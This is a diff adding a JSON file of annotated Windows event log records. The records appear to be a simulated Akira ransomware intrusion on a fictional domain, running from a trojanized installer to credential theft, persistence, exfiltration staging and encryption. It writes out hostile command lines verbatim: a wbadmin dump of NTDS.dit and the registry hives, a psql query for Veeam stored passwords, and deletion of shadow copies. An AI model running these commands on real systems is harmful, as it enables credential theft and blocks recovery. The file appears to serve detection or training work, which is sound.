@@ -1,0 +1,176 @@
+[
+  {
+    "TimeCreated": "2025-07-15T13:55:12Z",
+    "EventID": 4624,
+    "Computer": "WS-IT-07.contoso.com",
+    "LogonType": 2,
+    "TargetUserName": "jsmith",
+    "TargetDomainName": "CONTOSO",
+    "IpAddress": "10.10.20.37",
+    "LogonProcessName": "User32",
+    "AuthenticationPackage": "Negotiate",
+    "Note": "Normal interactive workstation logon"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:02:47Z",
+    "EventID": 4688,
+    "Computer": "WS-IT-07.contoso.com",
+    "SubjectUserName": "jsmith",
+    "NewProcessName": "C:\\Windows\\System32\\msiexec.exe",
+    "CommandLine": "msiexec.exe /i \"\\\\FS01\\share\\downloads\\ManageEngine-OpManager.msi\"",
+    "ParentProcessName": "C:\\Windows\\explorer.exe",
+    "TokenElevationType": "%%1937",
+    "Note": "Elevated MSI install of trojanized installer"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:31:05Z",
+    "EventID": 4688,
+    "Computer": "WS-IT-07.contoso.com",
+    "SubjectUserName": "jsmith",
+    "NewProcessName": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "CommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "ParentProcessName": "C:\\Windows\\System32\\svchost.exe",
+    "Note": "WMI provider host spawns AdaptixC2 payload"
+  },
+  {
+    "TimeCreated": "2025-07-15T18:44:19Z",
+    "EventID": 4720,
+    "Computer": "DC01.contoso.com",
+    "SubjectUserName": "jsmith",
+    "TargetUserName": "backup_EA",
+    "TargetDomainName": "CONTOSO",
+    "Note": "New domain user created"
+  },
+  {
+    "TimeCreated": "2025-07-15T18:44:41Z",
+    "EventID": 4728,
+    "Computer": "DC01.contoso.com",
+    "SubjectUserName": "jsmith",
+    "MemberName": "CN=backup_EA,CN=Users,DC=contoso,DC=com",
+    "TargetUserName": "Enterprise Admins",
+    "Note": "backup_EA added to Enterprise Admins"
+  },
+  {
+    "TimeCreated": "2025-07-15T18:45:03Z",
+    "EventID": 4738,
+    "Computer": "DC01.contoso.com",
+    "SubjectUserName": "jsmith",
+    "TargetUserName": "administrator",
+    "Note": "Built-in administrator account modified (password reset)"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:12:56Z",
+    "EventID": 4625,
+    "Computer": "DC01.contoso.com",
+    "TargetUserName": "administrator",
+    "IpAddress": "10.10.20.37",
+    "LogonType": 3,
+    "FailureReason": "%%2313",
+    "Status": "0xC000006D",
+    "Note": "Failed logon - credential validation"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:13:02Z",
+    "EventID": 4625,
+    "Computer": "DC01.contoso.com",
+    "TargetUserName": "administrator",
+    "IpAddress": "10.10.20.37",
+    "LogonType": 3,
+    "FailureReason": "%%2313",
+    "Status": "0xC000006D",
+    "Note": "Failed logon"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:13:20Z",
+    "EventID": 4624,
+    "Computer": "DC01.contoso.com",
+    "LogonType": 10,
+    "TargetUserName": "backup_EA",
+    "TargetDomainName": "CONTOSO",
+    "IpAddress": "10.10.20.37",
+    "LogonProcessName": "User32",
+    "AuthenticationPackage": "Negotiate",
+    "Note": "RDP (Type 10) into DC using attacker-created EA account"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:13:21Z",
+    "EventID": 4672,
+    "Computer": "DC01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "PrivilegeList": "SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, SeTcbPrivilege",
+    "Note": "Special privileges assigned to new logon"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:21:38Z",
+    "EventID": 4688,
+    "Computer": "DC01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "NewProcessName": "C:\\Windows\\System32\\wbadmin.exe",
+    "CommandLine": "wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY -quiet",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "NTDS.dit + hive extraction via wbadmin"
+  },
+  {
+    "TimeCreated": "2025-07-16T11:04:10Z",
+    "EventID": 4624,
+    "Computer": "FS01.contoso.com",
+    "LogonType": 3,
+    "TargetUserName": "backup_EA",
+    "TargetDomainName": "CONTOSO",
+    "IpAddress": "10.10.10.10",
+    "LogonProcessName": "NtLmSsp",
+    "AuthenticationPackage": "NTLM",
+    "Note": "Network logon to file server from DC"
+  },
+  {
+    "TimeCreated": "2025-07-16T11:05:52Z",
+    "EventID": 7045,
+    "Computer": "FS01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "ServiceName": "RustDesk",
+    "ImagePath": "\"C:\\Program Files\\RustDesk\\RustDesk.exe\" --tray",
+    "ServiceType": "user mode service",
+    "StartType": "auto start",
+    "Note": "Remote access tool installed as service (persistence)"
+  },
+  {
+    "TimeCreated": "2025-07-16T16:47:33Z",
+    "EventID": 4688,
+    "Computer": "BKP01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "NewProcessName": "C:\\Program Files\\PostgreSQL\\15\\bin\\psql.exe",
+    "CommandLine": "psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\"",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "Veeam credential database query"
+  },
+  {
+    "TimeCreated": "2025-07-16T22:15:09Z",
+    "EventID": 4688,
+    "Computer": "FS01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "NewProcessName": "C:\\ProgramData\\FileZilla_3.68.1_win64_sponsored2-setup.exe",
+    "CommandLine": "FileZilla_3.68.1_win64_sponsored2-setup.exe",
+    "ParentProcessName": "C:\\Windows\\explorer.exe",
+    "Note": "FileZilla staged for SFTP exfiltration to 185.174.100.203"
+  },
+  {
+    "TimeCreated": "2025-07-17T03:22:41Z",
+    "EventID": 4688,
+    "Computer": "BKP01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "NewProcessName": "C:\\ProgramData\\locker.exe",
+    "CommandLine": "locker.exe -p=G:\\ -n=15",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "Akira ransomware execution (partial encryption)"
+  },
+  {
+    "TimeCreated": "2025-07-17T03:22:42Z",
+    "EventID": 4688,
+    "Computer": "BKP01.contoso.com",
+    "SubjectUserName": "backup_EA",
+    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\"",
+    "ParentProcessName": "C:\\ProgramData\\locker.exe",
+    "Note": "Shadow copy deletion (inhibit recovery)"
+  }
+]
